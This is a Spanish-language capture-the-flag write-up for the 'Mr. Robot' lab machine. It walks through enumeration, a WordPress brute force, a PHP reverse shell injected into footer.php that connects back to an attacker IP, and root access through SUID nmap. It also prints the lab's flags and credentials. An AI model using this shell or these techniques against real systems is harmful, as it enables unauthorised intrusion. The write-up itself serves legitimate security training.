@@ -1,0 +1,72 @@
+# Writeup CTF Mr. Robot
+
+## Resumen
+En esta máquina de nivel principiante/intermedio, el objetivo era encontrar tres claves ocultas. Para ello, realicé una enumeración exhaustiva, explotación de WordPress y escalada de privilegios para obtener acceso root y acceder a todas las claves.
+
+---
+
+## 1. Enumeración Inicial
+
+- Escaneo con `nmap` mostró puertos abiertos: 22 (SSH), 80 (HTTP), 443 (HTTPS).
+- Acceso a una consola web estilo Mr. Robot en la web principal.
+- Descubrí `robots.txt` con referencia a `fsocity.dic` y `key-1-of-3.txt`.
+- Leí el archivo `key-1-of-3.txt` y obtuve la primera clave: 073403c8a58a1f80d943455fb30724b9
+
+- Enumeré rutas con `gobuster` y usé `nikto` para buscar vulnerabilidades.
+
+---
+
+## 2. Ataque a WordPress
+
+- Se detectó WordPress 4.3.1, versión vulnerable.
+- Utilicé fuerza bruta vía XML-RPC con un script Python y el diccionario `fsocity.dic`.
+- Descubrí credenciales para el usuario `elliot` con la contraseña: ER28-0652
+
+- Entré en el panel de WordPress con esas credenciales.
+
+---
+
+## 3. Obtención de Reverse Shell
+
+- Subí una reverse shell PHP modificando el archivo `footer.php` del tema activo con el siguiente código:
+
+```php
+<?php
+set_time_limit(0);
+$ip = 'LA IP';
+$port = 4444;
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+?>
+
+Configuré un listener en Kali con: nc -lvnp 4444
+Accedí a la shell como usuario daemon.
+
+4. Escalada a usuario robot
+Usé Python para mejorar la shell y conseguir una terminal interactiva: python3 -c 'import pty; pty.spawn("/bin/bash")'
+Cambié a usuario robot con la contraseña password (descubierta mediante hash MD5).
+
+Conseguí la segunda clave leyendo: 822c73956184f694993bede3eb39f959
+
+5. Escalada a root
+Encontré que nmap estaba instalado con SUID.
+
+Ejecuté nmap en modo interactivo: /usr/local/bin/nmap --interactive
+Desde el prompt de nmap lancé: /root/key-3-of-3.txt
+Conseguí la tercera clave leyendo: 04787ddef27c3dee1ee161b21670b4e4
+
+---
+
+## Lo aprendido
+
+- Cómo realizar una enumeración efectiva de puertos y servicios con herramientas como `nmap`, `gobuster` y `nikto`.
+- Interpretar y aprovechar archivos expuestos como `robots.txt` y diccionarios encontrados (`fsocity.dic`).
+- Fuerza bruta efectiva en WordPress usando WPScan, que fue la herramienta con la que conseguí la contraseña de elliot
+- Técnicas para subir y ejecutar una reverse shell PHP para obtener acceso inicial.
+- Mejorar la shell con Python para tener una terminal interactiva más usable.
+- Escalar privilegios localmente usando binarios con SUID, en especial con `nmap` y el método interactivo.
+- Uso de hashes para obtener contraseñas y cambiar de usuario dentro de la máquina víctima.
+- Cómo buscar y extraer claves o flags en diferentes directorios protegidos.
+- Documentación clara y ordenada para presentar los hallazgos y procesos de un CTF.
+
+---
